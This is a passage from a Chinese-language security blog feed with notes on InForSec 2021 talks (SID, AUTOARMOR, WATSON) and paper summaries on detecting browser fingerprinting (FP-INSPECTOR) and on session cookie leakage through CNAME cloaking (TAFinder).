start="3"><li>符号规则比较</li></ol><ul><li>对于打了补丁的版本<br>在打了补丁的版本中，存在的漏洞往往是存在于补丁之后。例如，对于越界访问来说，通常补丁会在进行访问操作之前校验访问的空间是否是正确的。换句话来说，在打了补丁的版本中，违反安全规则这一行为是不存在的，即打了补丁的版本不存在相应的漏洞。</li><li>对于没打补丁的版本<br>对于没有打补丁的版本，由于其存在漏洞的代码是程序执行流程中可达的，因此执行程序的过程中是会出发漏洞的。换句话来说，对于没有打补丁的版本来说，不违反安全规则这一行为是不存在的，即没有打补丁的版本一定存在相应的漏洞。</li></ul><p>通过这两方面的约束，才能够证明这个补丁修复的是一个安全相关的 bug。</p><p><strong>方法表现</strong><br>作者分析了 54K 的补丁，平均对每个补丁的分析时间为 0.83 秒。同时，作者主要从假阳性和假阴性两方面来分析</p><ol><li>假阳性分析<br>作者通过 SID 共计找出了 227 个安全相关的 bug，其中仅有 8 个假阳性的样例</li><li>假阴性分析<br>53%的假阴性，绝大部分都是因为对安全代码和漏洞代码的覆盖不完全导致的，这是有待改进的地方。</li></ol><p><strong>总结</strong></p><ul><li>及时修补安全漏洞需要确定安全影响<ul><li>补丁的传播成本很高，维护者时间和精力有限</li><li>为此，维护者需要确定和及时修复那些与安全相关的 bug</li></ul></li><li>使用受约束的符号执行的特性来确定哪些是与安全相关的 bug，哪些是常规的 bug<ul><li>SID：符号规则比较</li></ul></li><li>SID 发现了内核中许多被忽视的安全漏洞</li></ul><h1 id="Session-2"><a href="#Session-2" class="headerlink" title="Session 2"></a>Session 2</h1><h2 id="Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices"><a href="#Automatic-Policy-Generation-for-Inter-Service-Access-Control-of-Microservices" class="headerlink" title="Automatic Policy Generation for Inter-Service Access Control of Microservices"></a>Automatic Policy Generation for Inter-Service Access Control of Microservices</h2><p><strong>研究背景</strong><br>云应用架构的演进，从传统的模块紧耦合、不易维护和扩展的单体架构演变为将模块解耦、独立开发和部署的微服务架构，再到统一管理服务间通信的服务网格。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/eade3d98-e479-498d-8e0e-2691b4d25601.png"></p><p><strong>研究动机</strong><br>首先是微服务之间通过网络 API 的通信方式会带来一些新的攻击面。其次，不安全的容器镜像可能会导致容器被渗透。</p><p>一个具体的例子：</p><ul><li>威胁：被攻破的微服务可能通过恶意请求窃取数据或发起攻击</li><li>对策：服务间细粒度的访问控制</li></ul><p>现在的微服务应用具有规模庞大且频繁更新的特点，如果手工配置访问控制策略的话，不仅耗时巨大且容易出错，也相对没那么灵活。</p><p>现有的分布式系统中的安全策略自动化方法：</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ed93ef9-3bda-4404-9425-eb29775f6811.png"></p><p><strong>设计思路</strong><br>微服务应用的特点：</p><ul><li>单个微服务的内部复杂度较低</li><li>单个应用类<ul><li>微服务间的调用方式相对统一</li><li>涉及到的服务间调用协议和调用库的数量也十分有限</li></ul></li></ul><p>结合以上特点，作者采用了通过静态分析的方式从微服务代码中提取其正常的系统行为。<br>于是作者便提出了：<br><em>GOAL: 自动生成、维护、更新微服务的服务间访问控制策略</em><br><em>Challenge：如何获取完整、细粒度的服务间调用逻辑；如何对服务间的访问控制策略进行高效的生成和更新</em></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7d66b478-8d85-46b0-8574-dd46510184af.png"><br><em>基于静态分析的微服务间调用请求提取</em><br>具体来说分为三步：第一步识别网络 API 调用语句，即发起服务间调用的关键语句；第二步以第一步获取的关键语句为起点，沿数据流反向进行污点传播，获取程序切片；第三步通过语义分析在程序切片中提取服务间调用的详细属性。</p><p><em>基于图的微服务间访问控制策略管理</em><br>运行时的策略检查时间随着安装的服务间访问控制策略数目线性增加，这会造成整个微服务应用性能下降。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/c43d41df-d252-40bc-b189-b6413e3bc57b.png"></p><p>往往同一微服务可能会存在不同版本在同一时间提供不同的服务，这又会造成冗余，于是作者提出了一种优化思路：将同一服务的各版本共有的权限进行整合。这既消除了冗余，减少了策略总数，又消除了不必要的策略更新。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0c1b8d6e-f1d6-474b-83f3-ebe06a734434.png"></p><p><strong>AUTOARMOR</strong></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/85a45a24-0b14-4f3f-94b8-5a1f5ce33a3b.png"><br>AUTOARMOR 主要由三部分构成：</p><ol><li>静态分析引擎<br>服务 E 代码提交，静态分析引擎生成清单文件描述其发起的调用。</li><li>权限引擎<br>在 E 部署时，权限引擎获取其清单文件，生成权限节点加入权限图</li><li>策略生成器<br>策略生成器根据权限图的变化生成并下发访问控制策略。</li></ol><p>策略生成：将与当前权限节点相关的每个请求边翻译成一条服务间访问控制策略；如果一个调用请求的目标微服务尚未部署，就不授予微服务相应的权限</p><p>策略更新：版本更新对应版本节点的添加；版本回滚对应版本节点的删除</p><p><strong>总结</strong><br>AUTOARMOR 是第一个微服务间访问控制策略自动生成的解决方案。主要涉及到的一些技术有：</p><ul><li>一个基于静态分析的微服务间调用请求自动提取机制</li><li>一个基于图的自动化为服务间访问控制策略管理机制</li></ul><p>AUTOARMOR 可以有效地实现微服务间访问控制策略的自动生成、维护和更新，但只引入极小的性能开销。</p><h1 id="Session-3"><a href="#Session-3" class="headerlink" title="Session 3"></a>Session 3</h1><h2 id="Understanding-Audit-Logs-Techniques-Experience-and-Requirements"><a href="#Understanding-Audit-Logs-Techniques-Experience-and-Requirements" class="headerlink" title="Understanding Audit Logs: Techniques, Experience, and Requirements"></a>Understanding Audit Logs: Techniques, Experience, and Requirements</h2><p>作者首先分享了其对于研究的一些理解和经验</p><p><strong>计算机系统研究的维度</strong><br>通常来说，开始一项研究往往由 Project/Paper 开始，向下是其具体的 Implementation，向上是其抽象的 Thesis/Theme。<br>对于 Thesis/Theme 来说，研究者需要将不同的 Claim 归纳为 Statement。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/5b32be9f-76f4-4311-94e1-a02db952a7ed.png" style="zoom: 70%;"><br>然后需要再将这些 Statement 进行总结，带入自己的一些想法，以形成在自己研究领域中的 View/Insight/Philosophy。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2a9287d3-c7bc-4905-9842-c329999a9df1.png" style="zoom: 70%;"><br>而对于不同的 Implementation，研究者需要再将其转换为 Tool/System/Platform，以方便纵向研究时能够较好地节省重复工作的成本。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/09c41055-2cee-47aa-a210-31a72bd646d6.png" style="zoom: 70%;"></p><p>综合来说，作为一名研究者，他应该既能写 paper 也能写工具，而读 pape 的目的是要去理解这些已有工作之间的关系，找出其中还没有做或者说还有待改进的地方。当你对于一个领域有一个稳定的 view 的时候才能够更好更深地去看待一个问题，以此来找 idea。</p><p><strong>系统研究的维度</strong><br>人与系统的相互影响如下<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d1506cfb-8d50-4387-89c0-1728b9d6cb14.png" style="zoom: 70%;"></p><ul><li>系统对系统的影响<br>系统与系统之间往往是孤立的，相应的要分析系统与系统之间的关系也就是分析不同系统之间的关联性</li><li>系统对人的影响<br>系统需要人来操作，相应的系统赋予了人有一定的责任来对系统负责</li><li>人对系统的影响<br>在系统中加入人的因素，而人往往是一个完备系统中的弱点。</li><li>人对人的影响<br>人对人的影响往往更多是在人类社会中的法律，伦理等问题上的影响。</li></ul><p><strong><em>Q: 怎么选取和开启一条线的研究?</em></strong><br>首先就是要多读这个领域相关的一些论文，在读这些论文的过程中需要体系化的总结。最终的目的是要发现一个缺失的研究点以此找到研究动机。其次，当要解决自己提出的问题，即当找解决方法的时候，可以找其他领域的解决方案然后将其映射到自己的领域里。当然，这个过程中会遇到一些新的挑战，这需要靠自己前期积累的一些背景知识来解决。</p><p>总的来说，找到一个感兴趣的新方向，第一是总结前几十年的前人的工作，完备自己的知识储备；第二就是读其他领域的论文，找到解决方案来解决遇到的研究问题。同时，当要将一条研究线做深的时候，后续的代码可以依据前一次实验的基础，例如将一个论文的实现做成 tool 或者 system。</p><p><strong>端点监视解决方案记录用于攻击调查的审计日志</strong><br>审计日志：</p><ul><li>表示 OS 级活动的事件历史记录</li><li>通过数据证明为安全事件提供可见性</li></ul><p><strong>行为抽象中的挑战</strong></p><ol><li>事件语义推断：日志记录一般用途的系统活动，但缺乏高级语义的知识</li><li>个人行为识别：审计日志的数量是十分庞大的</li></ol><p><strong>Insights</strong><br>Q: 分析者如何手动解释审计事件的语义？</p><ol><li>通过审计事件中的上下文信息来揭示系统实体和关系的语义。提取这种上下文语义的一般方法是采用嵌入模型，目的是将系统实体和关系映射到嵌入空间（即数字矢量空间）。</li><li>识别基于数据对象的信息流的行为。文中具体指的是属于个人行为的审计事件，主要是围绕着用户的预期目标，可以反映为一系列应用于数据对象的系统操作。如下图做一次审计事件的简化。<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/1d8d7347-39f5-4afd-9a06-bdde9859e815.png" style="zoom: 70%;"></li></ol><p><strong>WATSON</strong><br>WATSON 是一种自动化的行为抽象方法，它聚集了审计事件的语义来模拟行为模式。它不需要专家对事件语义的了解来执行行为抽象。语义是从审计日志中的事件使用背景中自动获得的，这个背景被称为是事件的上下文语义。具体来说，WATSON 首先利用基于翻译的嵌入模型来推断审计事件的语义，其依据是日志中的语境信息。 然后，WATSON 识别出与相关数据对象（即文件和网络套接字）相连的事件，并将其语义汇总为高级行为的表示。最后，WATSON 对审计日志中记录的类似行为进行聚类，并区分出其中的代表，供分析人员调查。</p><p>简而言之，WATSON 是一种自动的行为抽象方法，它聚合了审计日志的语义来建模行为模式。其输入为审计日志(Linux Audit)，输出则是具有代表性的行为。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7a6aa663-2228-430a-9da0-a6eea26f1211.png"></p><p>WATSON 弥补了低级审计日志与高级系统行为之间的语义鸿沟：</p><ul><li>在基于日志的 KG 中使用上下文信息（事件语义推断）</li><li>在语义上聚类相似行为（行为总结）</li></ul>]]></content>
      
      
      <categories>
          
          <category> Conference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> InForSec 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fingerprinting the Fingerprinters: Learning to Detect Browser Fingerprinting Behaviors</title>
      <link href="/2021/06/01/Fingerprinting%20the%20Fingerprinters%20-%20Learning%20to%20Detect%20Browser%20Fingerprinting%20Behaviors/"/>
      <url>/2021/06/01/Fingerprinting%20the%20Fingerprinters%20-%20Learning%20to%20Detect%20Browser%20Fingerprinting%20Behaviors/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：U Iqbal, S Englehardt, Z Shafiq</em></p><p><em>原文标题：Fingerprinting the Fingerprinters: Learning to Detect Browser Fingerprinting Behaviors</em></p><p><em>原文链接：<a href="https://conferences.computer.org/sppub/pdfs/sp/2021/893400b143.pdf">https://conferences.computer.org/sppub/pdfs/sp/2021/893400b143.pdf</a></em></p><p><em>原文来源：S&amp;P 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>浏览器指纹识别是一种侵入性的、不透明的无状态跟踪技术。浏览器供应商、学术界和标准机构长期以来一直在努力提供有效的保护措施，以在又不降低用户体验的前提下尽可能防止浏览器指纹识别。作者提出了FP-INSPECTOR，一种基于机器学习的句法-语义应用方法，以准确检测浏览器的指纹。根据实验结果来看，FP-INSPECTOR表现良好，它能够比最先进的技术多检测26%的指纹脚本。同时，建立在FP-INSPECTOR基础上的API级指纹反制措施有助于减少2倍影响网站完整性的因素。结果表明，现在有超过10%的前10万网站和超过四分之一的前10万网站存在浏览器指纹。作者还发现了以前没有报道过的指纹脚本对JavaScript API的使用，这表明这些指纹脚本正在以一些出人意料的方式来利用API。</p><h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ol><li>一种基于ML的语法-语义方法，结合了静态和动态分析来检测浏览器指纹行为。</li><li>评估由不同的缓解策略引起的网站不完整性，这些策略阻止了网络请求或限制了API。</li><li>一项针对Alexa排名前10万的网站上浏览器指纹脚本的测量研究</li><li>对JavaScript APIs进行聚类分析以发现新的浏览器指纹载体。</li></ol><h1 id="FP-INSPECTOR"><a href="#FP-INSPECTOR" class="headerlink" title="FP-INSPECTOR"></a>FP-INSPECTOR</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/99e0d167-1b6c-424d-8a3c-2b98633726d7.png"></p><h2 id="检测指纹脚本"><a href="#检测指纹脚本" class="headerlink" title="检测指纹脚本"></a>检测指纹脚本</h2><p>首先，FP-INSPECTOR并不依赖手工编码的启发式方法，而是会自行学习指纹脚本的新属性。具体来说，作者提取了大量的低级启发式方法来捕捉指纹脚本的句法和语义特性，以训练机器学习分类器。FP-INSPECTOR分类器是在已有研究的指纹脚本的基础上训练出来的，且能够推广为检测新的指纹脚本和以前未知的指纹方法。</p><p>第二，作者同时利用了静态特征（即脚本语法）和动态特征（即脚本的执行）。静态表征使其能够捕获在页面访问期间可能不会执行的指纹脚本或程序（例如，因为它们需要用户互动，而在自动抓取过程中很难模拟）。动态表征使其能够捕捉到被混淆的指纹脚本。FP-INSPECTOR针对静态和动态表征分别训练有监督的机器学习模型，并结合它们的输出来准确地将脚本分类为指纹或非指纹脚本。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>静态分析能够从JavaScript文件的内容和结构中捕获信息——包括那些在度量过程中没有执行的信息，或者那些没有被作者所扩展的检测覆盖的信息。</p><p><strong>AST表示法.</strong><br>首先，作者将脚本表示为抽象语法树（AST）。这样做便可以忽略脚本之间的编码风格差异和不断变化的JavaScript语法。AST将脚本编码为一棵语法基元树（例如，VariableDeclaration和ForStatement），其边缘代表代码语句之间的语法关系。</p><p><strong>脚本解包.</strong><br>将脚本表示为AST的过程很复杂，因为JavaScript是一种解释语言，在运行时编译。这允许脚本的部分内容以纯文本的形式存在，然后用eval或Function编译和执行。之前的工作表明，指纹脚本通常包括被eval或Function所括起来的代码。为了解开含有eval或Function的脚本，作者将它们嵌入到空的HTML网页中，并在一个工具化的浏览器中打开，这样就可以在JavaScript引擎解析脚本时提取它们。</p><p><strong>静态特征提取</strong><br>作者是从ASTs生成的静态特征。为了建立特征集，作者首先分层遍历AST，并将它们分成一对父节点和子节点。父节点代表上下文（如for loops、try statements或if conditions），子节点代表该上下文中的函数（如createElement、toDataURL和measureText）。简单地解析每个脚本的整个AST的父子对会导致所有脚本的特征数量过大（即数百万）。为了避免这种情况，作者只考虑父子对中至少有一个关键词与JavaScript API中的名称、方法或属性相匹配。作者将这些父子节点的组合作为所有脚本的特征向量进行组合，每个父子节点组合都被视为一个二进制特征（其中1表示存在一个特征，0表示没有）。</p><p>为了避免过度拟合，作者采用了无监督和有监督的特征选择方法来减少特征的数量。具体来说，首先去掉那些变化不大的特征（即方差&lt;0.01），并使用信息增益来缩短前一千名的特征列表。这使得FP-INSPECTOR能够保留代表最常用的指纹识别API的特征。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>虽然静态分析能够捕捉到脚本的语法结构，但当脚本被混淆或减化时，静态分析的效果会受到很大的影响。这一点至关重要，因为之前的研究表明，指纹脚本经常使用混淆来隐藏其功能。除了从脚本内容中提取静态特征外，作者还通过监控脚本的执行来提取动态特征。执行跟踪可以捕捉到脚本中的语义关系而无视混淆所带来的影响，这使得作者能够提取有关脚本功能的相关信息。</p><p><strong>动态特征提取</strong><br>作者使用两种方法来从执行过程中提取特征。首先，对脚本访问每个单独的API方法或属性的次数进行记录和统计，并将其作为一个特征。接下来，作者从支持参数传递或存在返回值的API中建立特征。作者没有直接使用参数或返回值，而是使用派生值来捕捉更高层次的语义，以便在分类过程中更好地进行泛化。</p><p>为了避免过度拟合，作者再次应用无监督和有监督的特征选择方法来限制特征的数量。与静态分析的特征减少类似，这使其能够保留代表最常用的API的特征，以便进行指纹识别。然后，作者利用排名前一千名的特征作为输入，训练了一个有监督的机器学习模型。</p><h3 id="对指纹脚本进行分类"><a href="#对指纹脚本进行分类" class="headerlink" title="对指纹脚本进行分类"></a>对指纹脚本进行分类</h3><p>FP-INSPECTOR使用了决策树分类器来训练一个机器学习模型。决策树是通过脚本的特征向量来进行分类的。在构建树的过程中，决策树会在每个节点上选择能最有效地分割数据的特征。具体来说，选择具有最高信息增益的属性，通过丰富一个类来分割数据。然后，决策树遵循同样的方法来递归划分子集，除非该子集属于一个类别或不能再被划分。</p><p>需要注意的是作者训练了两个独立的模型，并将它们的分类结果联合起来，而不是将脚本的静态和动态特征结合起来训练一个模型。也就是说，如果一个脚本被使用静态特征作为输入的模型或使用动态特征作为输入的模型归类为指纹脚本，那么它就被认为是一个指纹脚本。通过使用这种方法，作者对页面访问过程中加载的所有脚本进行分类。这些脚本包括从单独的URL加载的外部脚本和任何HTML文档中包含的内联脚本。</p><h2 id="指纹脚本对抗措施"><a href="#指纹脚本对抗措施" class="headerlink" title="指纹脚本对抗措施"></a>指纹脚本对抗措施</h2><p>现有的浏览器指纹对抗措施可分为内容封锁和 API 限制两大类。内容拦截会根据用户的网络位置(例如，域名或 URL)阻止用户下载指纹脚本。而API 限制并不会阻止指纹识别脚本的加载，而是限制了对某些 JavaScript API 的访问，这些 API 被用于浏览器指纹识别。<br>作者在先前研究的基础上提出了以下措施：</p><ol><li>黑名单API限制</li><li>有针对性的API限制</li><li>请求阻止</li><li>混合情况阻止</li></ol><h1 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h1><h2 id="准确性"><a href="#准确性" class="headerlink" title="准确性"></a>准确性</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/6d4cde95-1cc1-43cc-93d9-c6e69180e5b8.png"><br>上表列出了静态和动态模型的综合和单独结果。从表中可以看出，FP-INSPECTOR的分类器比启发式方法多检测出26%的脚本，假阳性率（FPR）为0.05%，假阴性率（FNR）为6.1%，可以忽略不计。总的来说，我们发现通过结合这些模型，FP-INSPECTOR的检测率提高了近10%，总体准确率达到99.9%，召回率为93.8%，精确度为93.1%。</p><h2 id="网站完整性"><a href="#网站完整性" class="headerlink" title="网站完整性"></a>网站完整性</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/95bd2bd5-ad57-4c5d-9ce3-16403d893c0b.png"><br>上表总结了网站的平均受损结果。总的来说，使用FP-INSPECTOR检测的有针对性的反击措施在特别容易被破坏的测试网站上减少了2倍的网站受损率。更具体地说，blanketAPI限制受到的影响最大（破坏了三分之二以上的测试网站），而有针对性的API限制造成的破坏最小（在大约75%的测试网站上没有重大破坏）。</p><h1 id="检测在野指纹"><a href="#检测在野指纹" class="headerlink" title="检测在野指纹"></a>检测在野指纹</h1><p>作者从Alexa排名前10万的网站收集数据，分析之后得出了以下结论以方便检测在野的一些指纹识别脚本：</p><ol><li>超过四分之一的顶级网站现在会对用户进行指纹识别</li><li>指纹识别在新闻网站上最为常见</li><li>指纹常用于打击广告欺诈，也用于潜在的跨站点跟踪</li></ol><h1 id="分析指纹常用的API"><a href="#分析指纹常用的API" class="headerlink" title="分析指纹常用的API"></a>分析指纹常用的API</h1><p>作者调查研究了那些常出现在检测到的指纹脚本中的节点和那些出现在fingerprintjs2中的节点所属的集群。虽然其发现了许多指纹脚本对JavaScript API的使用，但为了简洁的讨论，作者没有单独列出所有JavaScript API关键词，而是将它们按主题分组。同时，作者讨论了他们发现的每个被指纹脚本使用的新API是如何被滥用来提取关于用户或其设备的识别信息的。</p><h2 id="功能指纹"><a href="#功能指纹" class="headerlink" title="功能指纹"></a>功能指纹</h2><p>该类别包括浏览器指纹识别技术，用于探测浏览器支持的不同功能。现代网站依靠许多API来支持其丰富的功能。然而，并不是所有的浏览器都支持每一个API，或者可能有必要的用户权限。因此，网站可能需要探测API和权限以调整其功能。然而，这种功能探测有可能会泄露信息。</p><h2 id="算法指纹"><a href="#算法指纹" class="headerlink" title="算法指纹"></a>算法指纹</h2><p>这一类包括浏览器指纹识别技术，它不仅仅是简单地探测不同的功能。这些浏览器指纹识别技术使用不同的 JavaScript APIs 对某些输入进行算法处理，并利用不同的实现方式对这些输入进行不同的处理这一情况来泄露信息。作者既讨论了新发现的、以前在指纹脚本中没有观察到的JavaScript APIs的用途，也讨论了已知的指纹技术。</p><h1 id="方法局限性"><a href="#方法局限性" class="headerlink" title="方法局限性"></a>方法局限性</h1><p>FP-INSPECTOR的检测和缓解组件存在着一些限制。由于 FP-INSPECTOR 检测脚本粒度上的指纹，对抗性网站可以将指纹脚本分散成若干块，以避免检测或合并所有脚本(功能性脚本和指纹) ，从而避免执行缓解措施。</p><h2 id="通过脚本分散躲避检测"><a href="#通过脚本分散躲避检测" class="headerlink" title="通过脚本分散躲避检测"></a>通过脚本分散躲避检测</h2><p>在检测方面，FP-INSPECTOR只考虑脚本内部的句法和语义关系，不考虑脚本之间的关系。由于其目前的设计，FP-INSPECTOR在检测指纹时可能会遇到问题——指纹脚本的主要功能被划分到几个分散的脚本中。然而，FP-INSPECTOR可以通过对浏览器进行更深入的检测，扩展到捕获脚本之间的互动。。未来版本的FP-INSPECTOR也可以实现这样的工具化；特别是，FP-INSPECTOR可以扩展到捕捉脚本包含的父子关系。为了避免通过父子关系进行琐碎的检测，脚本分散技术需要将每个块从独立的祖先节点嵌入网站，并将结果返回到看似独立的服务器。因此，脚本分散也有一个维护成本：每次更新指纹脚本都需要将脚本分散到若干块中，并进行广泛的测试以确保正确执行。</p><h2 id="通过脚本合并躲避检测"><a href="#通过脚本合并躲避检测" class="headerlink" title="通过脚本合并躲避检测"></a>通过脚本合并躲避检测</h2><p>为了限制指纹，FP-INSPECTOR最有效的反制措施（即有针对性的API限制）是在脚本的粒度上应用的。FP-INSPECTOR可能会破坏所有脚本都被合并在一个脚本中的网站。然而，在这种情况下，可以采用更细化的执行方式来有效防止指纹识别。与脚本分散类似，脚本合并也有维护成本：任何脚本的每次更新都需要将所有脚本合并成一个。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>作者提出了FP-INSPECTOR，一种基于机器学习的句法-语义应用方法，以准确检测浏览器的指纹行为。FP-INSPECTOR超越了先前工作中的启发式方法，检测到的指纹脚本多了26%，并有助于将网站受损率降低2倍。FP-INSPECTOR的部署表明，现在浏览器指纹识别比以前更普遍。对Alexa排名前10万的网站的测量研究表明，10.18%的网站上部署了2349个不同的域的指纹脚本。</p><p>作者计划将提供指纹脚本的域名报告给追踪保护名单，如Disconnect 和 EasyPrivacy 。FP-INSPECTOR还发现了几个新的API的利用，这些API是首次被发现用于浏览器指纹识别的。作者计划将这些API的名称和统计数据报告给面向隐私的浏览器供应商和标准机构。为了促进后续研究，作者还将发布对OpenWPM的补丁、指纹识别对策原型扩展、新发现的指纹识别供应商名单，以及提交给跟踪保护列表、浏览器供应商和标准机构的错误报告，网址是<a href="https://uiowa-irl.github.io/FP-Inspector%E3%80%82">https://uiowa-irl.github.io/FP-Inspector。</a></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> S&amp;P 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</title>
      <link href="/2021/05/25/Oversharing%20Is%20Not%20Caring%20-%20How%20CNAME%20Cloaking%20Can%20ExposeYour%20Session%20Cookies/"/>
      <url>/2021/05/25/Oversharing%20Is%20Not%20Caring%20-%20How%20CNAME%20Cloaking%20Can%20ExposeYour%20Session%20Cookies/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Assel Aliyeva, Manuel Egele</em></p><p><em>原文标题：Oversharing Is Not Caring: How CNAME Cloaking Can ExposeYour Session Cookies</em></p><p><em>原文链接：<a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>原文来源：AsiaCCS 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网发展至今，一些在线业务通常会利用第三方的分析服务来深入了解其用户的行为。但由于隐私保护的发展及浏览器同源策略的限制，这在很大程度上限制了第三方Cookie的跟踪和使用。于是，企业开始尝试将第三方分析服务伪装成其网站的子域。这种被称为是CNAME伪装的技术使得企业能够继续监测其网站上的用户活动。但随之而来的是严重的安全隐患，因为企业与这些第三方分析服务提供商共享了用户会话Cookie，这使得在线用户的账户始终处于不安全的状态。在这篇文章中，作者演示了CNAME伪装以及Lax Cookie访问控制设置对Web用户安全性的影响。为了解决这一问题，作者构建了一个可以检测伪装为子域的第三方分析服务以及第一方Cookie泄露的工具TAFinder。</p><h1 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h1><ul><li>确定了第一方Cookie泄露给T/A(跟踪和广告)服务提供商的情况</li><li>构建了TAFinder用于自动识别网站中是否存在隐匿域并检测这些Cookie是否泄漏到这些域</li><li>针对这些隐匿域提出了一种基于HTTP的Web分析域检测机制，达到了96％的准确率</li><li>确定了2,139个在野的Web分析域</li><li>对100,000个最受欢迎的网站进行了测试，发现2,271个网站使用CNAME伪装技术将第三方分析服务作为其子域</li></ul><h1 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/749afbc8-7bb7-4449-9adf-28f0710e32bb.png"><br>TAFinder主要分为三个单元：</p><ol><li>数据采集</li><li>DNS处理</li><li>基于机器学习的检测<h2 id="数据采集"><a href="#数据采集" class="headerlink" title="数据采集"></a>数据采集</h2>以流水线的方式设计的TAFinder接受一个网站列表作为输入，然后由任务分配器将其分配给Worker。当从任务分配器中收到一个新的W(Website)时，一个Worker会生成一个新的爬虫实例。爬虫访问W，同时记录网络数据包和纯文本的HTTP请求/响应，并最终将捕获的数据传输给DNS处理单元。值得注意的是，Worker运行在独立的容器中，因此它允许TAFinder轻松地分离来自不同网站的网络流量。</li></ol><h2 id="DNS处理"><a href="#DNS处理" class="headerlink" title="DNS处理"></a>DNS处理</h2><p>TAFinder从任何给定的W中提取一组隐匿域CW。DNS处理单元对涉及CNAME的W的每个子域进行DNS解析链的遍历。如果一个解析链以属于第三方的CNAME结束，DNS处理单元将相应的子域标记为隐匿域D。</p><h2 id="基于机器学习的检测"><a href="#基于机器学习的检测" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder首先使用黑名单和Virus Total将CW中的域识别为T/A服务。为了将CW中剩余的未标记的隐匿域分类为T/A或非T/A，TAFinder部署了一种监督机器学习方法。为此，其设计了九种特征，以捕捉T/A服务固有的行为模式。这些特征是从访问W时与隐匿域的HTTP通信中提取的。<br>下面是九个特征:</p><ol><li>当加载W的所有资源时，以D为目标的HTTP请求的数量超过所有HTTP请求的数量</li><li>当加载W的所有资源时，来自D的HTTP响应的总大小超过所有HTTP响应大小的总和</li><li>D所设置的cookies总数</li><li>在D设置的所有cookies数量中，长cookies的数量</li><li>D设置的常规的非目标cookies的数量</li><li>D设置的常规的目标cookie的数量<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/8ab9b802-d526-4eb1-b228-85fe9b95ed0f.png"></li><li>在URL中使用的参数数量超过了以D为目标的HTTP请求的数量</li><li>目标为D的URL中包括W的域名作为参数值之一的次数</li><li>Content-Type特征<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/f4341811-3dc8-417f-a9d1-44d6ecc95c1a.png"></li></ol><p><strong>特征重要性排序</strong><br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b679fc1b-c741-44e2-8eb2-6ae183fcebcd.png"></p><h1 id="系统实现"><a href="#系统实现" class="headerlink" title="系统实现"></a>系统实现</h1><h2 id="数据采集和DNS处理"><a href="#数据采集和DNS处理" class="headerlink" title="数据采集和DNS处理"></a>数据采集和DNS处理</h2><p>在数据采集单元，TAFinder采用了RabbitMQ来实现任务分配，这使得作者可以并行扩展和运行10个Worker。每个Worker由一个独立运行的Linux容器表示，这些容器均配置好了Tcpdump和MitmProxy用于记录网络数据包和纯文本的HTTP请求/响应。Worker使用一个基于selenium的爬虫来启动对每个单独的网站的爬取。在爬取完毕后销毁实例，压缩并将捕获到的数据存储下来。在DNS处理单元则使用了Python的Scapy库分别提取每个网站的隐匿域。</p><h2 id="基于机器学习的检测-1"><a href="#基于机器学习的检测-1" class="headerlink" title="基于机器学习的检测"></a>基于机器学习的检测</h2><p>TAFinder是靠一份T/A列表（来源包括了已被标记的第三方分析服务提供商和VirusTotal等）来标记要提取的隐匿域。同时，根据VirusTotal提供的类别来标记数据集中的在野隐匿域。</p><p>TAFinder使用MitmProxy的Python模块解析这些数据，并从中提取特征。同时。鉴于有一大批不同的cookie名称需要分类，TAFinder只选取那些最流行的cookie。为此，作者提取了所有隐匿域的HTTP响应中的cookie名称。然后，根据发送cookie的隐匿域的数量对cookie进行排名。以同样的方式，作者又创建了两个流行度排名，专门针对非T/A和T/A服务设置的cookies。</p><p>作者从上面cookie排名中选中了最受欢迎的25个cookie，以及60个隶属于T/A和非T/A域的cookie名称。根据One Trust的cookie分类，作者将这些cookie归类为T/A 